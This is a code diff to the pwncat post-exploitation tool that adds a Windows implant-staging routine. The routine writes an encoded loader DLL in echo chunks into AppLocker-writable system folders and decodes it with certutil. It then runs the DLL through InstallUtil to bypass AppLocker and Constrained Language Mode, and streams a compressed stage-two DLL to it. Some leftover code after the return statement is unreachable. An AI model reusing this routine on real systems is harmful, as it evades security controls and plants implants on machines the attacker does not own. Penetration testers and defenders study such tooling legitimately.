@@ -349,8 +349,131 @@ class Windows(Platform):
         - "/* END CODE BLOCK */"
         """
 
+        possible_dirs = [
+            "C:\\Windows\\Tasks",
+            "C:\\Windows\\Temp",
+            "C:\\windows\\tracing",
+            "C:\\Windows\\Registration\\CRMLog",
+            "C:\\Windows\\System32\\FxsTmp",
+            "C:\\Windows\\System32\\com\\dmp",
+            "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
+            "C:\\Windows\\System32\\spool\\PRINTERS",
+            "C:\\Windows\\System32\\spool\\SERVERS",
+            "C:\\Windows\\System32\\spool\\drivers\\color",
+            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter",
+            "C:\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)",
+            "C:\\Windows\\SysWOW64\\FxsTmp",
+            "C:\\Windows\\SysWOW64\\com\\dmp",
+            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter",
+            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System",
+        ]
+        chunk_sz = 1900
+
+        loader_encoded_name = pwncat.util.random_string()
+
+        # Read the loader
+        with open(
+            pkg_resources.resource_filename("pwncat", "data/loader.dll"), "rb"
+        ) as filp:
+            loader_dll = base64.b64encode(filp.read())
+
+        # Extract first chunk
+        chunk = loader_dll[0:chunk_sz].decode("utf-8")
+        good_dir = None
+        loader_remote_path = None
+
+        self.channel.recvuntil(b">")
+
+        # Find available file by trying to write first chunk
+        for possible in possible_dirs:
+            loader_remote_path = pathlib.PureWindowsPath(possible) / loader_encoded_name
+            good_dir = possible
+            self.channel.send(
+                f"""echo {chunk} >"{str(loader_remote_path)}"\n""".encode("utf-8")
+            )
+            self.channel.recvline()
+            result = self.channel.recvuntil(b">")
+            if b"denied" not in result.lower():
+                self.session.manager.log(f"Good path: {possible}")
+                break
+        else:
+            self.session.manager.log(f"Bad path: {possible}")
+            self.session.manager.log(result)
+            raise PlatformError("no writable applocker-safe directories")
+
+        # Write remaining chunks to selected path
+        for c in range(chunk_sz, len(loader_dll), chunk_sz):
+            self.channel.send(
+                f"""echo {loader_dll[c:c+chunk_sz].decode('utf-8')} >>"{str(loader_remote_path)}"\n""".encode(
+                    "utf-8"
+                )
+            )
+            self.channel.recvline()
+            self.channel.recvuntil(b">")
+
+        # Decode the base64 to the actual dll
+        self.channel.send(
+            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
+                "utf-8"
+            )
+        )
+        self.channel.recvline()
+        self.channel.recvuntil(b">")
+
+        self.channel.send(f"""del "{str(loader_remote_path)}"\n""".encode("utf-8"))
+        self.channel.recvline()
+        self.channel.recvuntil(b">")
+
+        # Search for all instances of InstallUtil within all installed .Net versions
+        self.channel.send(
+            """cmd /c "dir C:\Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$"\n""".encode(
+                "utf-8"
+            )
+        )
+        self.channel.recvline()
+
+        # Select the newest version
+        result = self.channel.recvuntil(b">").decode("utf-8")
+        install_utils = [
+            x.rstrip("\r") for x in result.split("\n") if x.rstrip("\r") != ""
+        ][-2]
+
+        # Note whether this is 64-bit or not
+        is_64 = "\\Framework64\\" in install_utils
+
+        self.session.manager.log(f"Selected Install Utils: {install_utils}")
+
+        install_utils = install_utils.replace(" ", "\\ ")
+
+        # Execute Install-Util to bypass AppLocker/CLM
+        self.channel.send(
+            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
+                "utf-8"
+            )
+        )
+
+        # Wait for loader to
+        self.channel.recvuntil(b"READY")
+        self.channel.recvuntil(b"\n")
+
+        # Send stagetwo
+        with open(
+            pkg_resources.resource_filename("pwncat", "data/stagetwo.dll"), "rb"
+        ) as filp:
+            stagetwo_dll = filp.read()
+            compressed = BytesIO()
+            with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
+                gz.write(stagetwo_dll)
+            encoded = base64.b64encode(compressed.getvalue())
+
+        self.channel.sendline(encoded)
+        self.channel.recvuntil(b"READY")
+        self.channel.recvuntil(b"\n")
+
+        return
+
         # Read stage two source code
-        stage_two_path = pkg_resources.resource_filename("pwncat", "data/stagetwo.cs")
+        stage_two_path = pkg_resources.resource_filename("pwncat", "data/loader.dll")
         with open(stage_two_path, "rb") as filp:
             source = filp.read()
 
@@ -579,6 +702,8 @@ class Windows(Platform):
 
         self.channel.send(f"open\n{str(path)}\nmode\n".encode("utf-8"))
         result = self.channel.recvuntil(b"\n").strip()
+
+        self.session.log(result)
 
         try:
             handle = int(result)
